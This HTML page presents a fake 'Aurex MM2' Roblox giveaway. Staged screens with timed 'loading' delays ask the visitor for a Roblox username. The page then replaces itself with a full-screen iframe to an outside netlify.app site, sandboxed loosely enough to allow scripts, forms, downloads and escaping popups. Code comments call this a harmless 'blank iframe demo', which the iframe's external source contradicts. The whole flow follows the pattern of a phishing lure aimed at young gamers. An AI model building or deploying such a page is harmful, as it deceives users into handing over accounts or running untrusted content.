
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Aurex Giveaway</title>

<style>
* {
  box-sizing: border-box;
}

html, body {
  margin: 0;
  min-height: 100%;
  font-family: Arial, sans-serif;
  background: #000;
  color: white;
}

.win {
  min-height: 100dvh;
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
  position: relative;
  overflow: hidden;
  padding: 20px;
  background: #000;
}

#particle-canvas {
  position: absolute;
  inset: 0;
  width: 100%;
  height: 100%;
  pointer-events: none;
}
[hidden] {
  display: none !important;
}
.splash-container {
  position: relative;
  z-index: 2;
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
}

.giveaway-card {
  width: 100%;
  max-width: 420px;
  background: rgba(18, 11, 11, 0.92);
  border: 2px solid #b30021;
  border-radius: 24px;
  padding: 40px 24px;
  text-align: center;
  box-shadow: 0 0 25px rgba(179, 0, 33, 0.4);
  animation: appear .35s ease;
}

@keyframes appear {
  from { opacity: 0; transform: scale(.96); }
  to { opacity: 1; transform: scale(1); }
}

.icon-box {
  width: 60px;
  height: 60px;
  border: 2px solid #b30021;
  border-radius: 14px;
  display: inline-flex;
  justify-content: center;
  align-items: center;
  font-size: 28px;
  font-weight: bold;
  color: #ff1a40;
  margin-bottom: 24px;
}

h1 {
  color: #ff1a40;
  font-size: 28px;
  margin: 0 0 18px;
  letter-spacing: 1px;
  line-height: 1.3;
}

p {
  color: #aaa;
  font-size: 14px;
  line-height: 1.6;
  margin: 0 0 24px;
}

button {
  padding: 16px;
  border-radius: 12px;
  font-size: 14px;
  font-weight: bold;
  letter-spacing: 1px;
  cursor: pointer;
}

.continue-btn, .submit-btn {
  width: 100%;
  background: #b30021;
  color: white;
  border: none;
}

.btn-row {
  display: flex;
  gap: 12px;
}

.proceed-btn {
  flex: 1;
  background: #b30021;
  color: white;
  border: none;
}

.close-btn {
  flex: 1;
  background: transparent;
  color: white;
  border: 2px solid #44151c;
}

button:hover {
  filter: brightness(1.2);
}

button:active {
  transform: scale(.98);
}

.username-input {
  width: 100%;
  padding: 16px;
  margin-bottom: 8px;
  background: rgba(20, 10, 10, .8);
  border: 1px solid #44151c;
  border-radius: 12px;
  color: white;
  outline: none;
  font-size: 15px;
  text-align: center;
}

.username-input::placeholder {
  color: #777;
}

.warning-message {
  display: none;
  color: #ff3333;
  font-size: 12px;
  line-height: 1.5;
  margin: 4px 0 16px;
}

.footer-text {
  display: block;
  margin-top: 32px;
  color: #666;
  font-size: 11px;
  letter-spacing: 3px;
  text-transform: uppercase;
}

.spinner {
  width: 50px;
  height: 50px;
  border: 4px solid rgba(179, 0, 33, .2);
  border-left-color: #ff1a40;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin: 0 auto;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}

/* Separate full-screen demo page */
#frameScreen {
  position: fixed;
  inset: 0;
  width: 100%;
  height: 100dvh;
  background: #000;
  z-index: 1000;
}

#frameScreen iframe {
  display: block;
  width: 100%;
  height: 100%;
  border: 0;
  background: #000;
}

@media (max-width: 360px) {
  .giveaway-card {
    padding: 30px 18px;
  }

  h1 {
    font-size: 24px;
  }

  .btn-row {
    gap: 8px;
  }

  .proceed-btn, .close-btn {
    padding: 14px 8px;
    font-size: 12px;
  }
}
</style>
</head>

<body>

<div class="win" id="mainApp">
  <canvas id="particle-canvas"></canvas>

  <section class="splash-container" id="stage1Screen">
    <div class="giveaway-card">
      <div class="icon-box">A</div>
      <h1>Aurex MM2<br>Giveaway</h1>
      <p>
        Join our private server for an exclusive Murder Mystery 2
        giveaway. Read the entry details and continue to participate.
      </p>
      <button class="continue-btn" onclick="triggerLoadingScreen()">
        CONTINUE
      </button>
      <span class="footer-text">Aurex Giveaway</span>
    </div>
  </section>

  <section class="splash-container" id="loadingScreen" hidden>
    <div class="giveaway-card">
      <div class="spinner"></div>
      <h1 style="font-size:20px;margin-top:24px">
        Loading Server Data...
      </h1>
      <span class="footer-text">Aurex Giveaway</span>
    </div>
  </section>

  <section class="splash-container" id="stage2Screen" hidden>
    <div class="giveaway-card">
      <h1>Private Server<br>Access</h1>
      <p>
        You're one step away from the Aurex MM2 Giveaway!
        Proceed to continue or close this page to return to the homepage.
      </p>
      <div class="btn-row">
        <button class="proceed-btn" onclick="goToStage3()">
          PROCEED
        </button>
        <button class="close-btn" onclick="returnToFirstPage()">
          CLOSE
        </button>
      </div>
      <span class="footer-text">Aurex Giveaway</span>
    </div>
  </section>

  <section class="splash-container" id="stage3Screen" hidden>
    <div class="giveaway-card">
      <h1>Player<br>Registration</h1>
      <p>
        Enter your Roblox username to get Private Server Link and Verify your giveaway entry.
        Check that the username is correct before submitting.
      </p>

      <input
        type="text"
        class="username-input"
        id="robloxUsername"
        placeholder="Enter Your Roblox Username!"
        maxlength="20"
        autocomplete="off"
        aria-label="Roblox username"
      >

      <div class="warning-message" id="usernameWarning" role="alert">
        Username must be 3–20 characters, using letters, numbers,
        and underscores only.
      </div>

      <button class="submit-btn" id="submitBtn"
        onclick="validateAndSubmitEntry()">
        SUBMIT
      </button>

      <span class="footer-text">Aurex Giveaway</span>
    </div>
  </section>

  <section class="splash-container" id="submitLoadingScreen" hidden>
    <div class="giveaway-card">
      <div class="spinner"></div>
      <h1 style="font-size:20px;margin-top:24px">
        Processing Entry...
      </h1>
      <p>Please wait while this Bot processes your entry.</p>
      <span class="footer-text">Aurex Giveaway</span>
    </div>
  </section>
</div>

<!-- Separate, clearly identified blank iframe demo -->
<section id="frameScreen" hidden aria-label="Blank iframe demo">
  <iframe
    title="Blank iframe demonstration"
    src="https://mellow-cat-7b5c54.netlify.app/"
    sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-downloads allow-modals allow-pointer-lock allow-presentation allow-orientation-lock allow-popups-to-escape-sandbox"
    referrerpolicy="no-referrer">
  </iframe>
</section>

<script>
const mainApp = document.getElementById("mainApp");
const stage1 = document.getElementById("stage1Screen");
const loadingScreen = document.getElementById("loadingScreen");
const stage2 = document.getElementById("stage2Screen");
const stage3 = document.getElementById("stage3Screen");
const submitLoadingScreen =
  document.getElementById("submitLoadingScreen");

const frameScreen = document.getElementById("frameScreen");
const inputField = document.getElementById("robloxUsername");
const warningText = document.getElementById("usernameWarning");
const submitBtn = document.getElementById("submitBtn");

let loadingTimer = null;
let submitting = false;

function showScreen(screen) {
  [
    stage1,
    loadingScreen,
    stage2,
    stage3,
    submitLoadingScreen
  ].forEach(item => {
    item.hidden = item !== screen;
  });
}

function triggerLoadingScreen() {
  clearTimeout(loadingTimer);
  showScreen(loadingScreen);

  loadingTimer = setTimeout(() => {
    showScreen(stage2);
  }, 2000);
}

function goToStage3() {
  showScreen(stage3);
}

function returnToFirstPage() {
  clearTimeout(loadingTimer);
  showScreen(stage1);
}

function validateAndSubmitEntry() {
  if (submitting) return;

  const username = inputField.value.trim();
  const validUsername = /^[A-Za-z0-9_]{3,20}$/.test(username);

  if (!validUsername) {
    warningText.style.display = "block";
    inputField.style.borderColor = "#ff3333";
    inputField.focus();
    return;
  }

  warningText.style.display = "none";
  inputField.style.borderColor = "#44151c";

  submitting = true;
  submitBtn.disabled = true;
  showScreen(submitLoadingScreen);

  loadingTimer = setTimeout(() => {
    /*
      Demo only: no username is transmitted.
      Show a separate full-screen blank iframe demo.
    */
    mainApp.hidden = true;
    frameScreen.hidden = false;
    submitting = false;
    submitBtn.disabled = false;
  }, 2000);
}

inputField.addEventListener("input", () => {
  warningText.style.display = "none";
  inputField.style.borderColor = "#44151c";
});

// Background particle animation
const canvas = document.getElementById("particle-canvas");
const ctx = canvas.getContext("2d");

let particles = [];
const particleCount = 85;

function resizeCanvas() {
  const rect = canvas.getBoundingClientRect();
  const dpr = Math.min(window.devicePixelRatio || 1, 2);

  canvas.width = rect.width * dpr;
  canvas.height = rect.height * dpr;

  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
  createParticles();
}

function createParticles() {
  particles = [];

  const width = canvas.clientWidth;
  const height = canvas.clientHeight;

  for (let i = 0; i < particleCount; i++) {
    particles.push({
      x: Math.random() * width,
      y: Math.random() * height,
      size: Math.random() * 2.2 + 0.4,
      speedX: (Math.random() - 0.5) * 0.3,
      speedY: -(Math.random() * 0.7 + 0.2),
      alpha: Math.random() * 0.7 + 0.3
    });
  }
}

function animateParticles() {
  const width = canvas.clientWidth;
  const height = canvas.clientHeight;

  ctx.clearRect(0, 0, width, height);

  particles.forEach(p => {
    p.x += p.speedX;
    p.y += p.speedY;

    if (p.y < 0) {
      p.y = height;
      p.x = Math.random() * width;
    }

    if (p.x < 0 || p.x > width) {
      p.speedX *= -1;
    }

    ctx.save();
    ctx.globalAlpha = p.alpha;
    ctx.beginPath();
    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
    ctx.fillStyle = "#ff0033";
    ctx.shadowBlur = 6;
    ctx.shadowColor = "#ff0033";
    ctx.fill();
    ctx.restore();
  });

  requestAnimationFrame(animateParticles);
}

window.addEventListener("resize", resizeCanvas);

resizeCanvas();
animateParticles();
</script>

</body>
</html>
